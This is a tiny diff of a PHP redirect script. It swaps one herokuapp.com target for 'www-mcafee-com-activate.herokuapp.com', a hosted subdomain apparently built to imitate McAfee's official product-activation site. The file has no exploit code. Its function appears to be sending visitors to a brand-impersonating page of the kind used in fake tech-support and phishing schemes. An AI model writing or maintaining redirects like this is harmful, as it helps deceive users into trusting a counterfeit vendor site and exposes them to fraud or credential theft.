@@ -1,4 +1,4 @@
 <?php
-header("Location: https://all-act.herokuapp.com/actmca");
+header("Location: https://www-mcafee-com-activate.herokuapp.com/");
 die();
 ?>
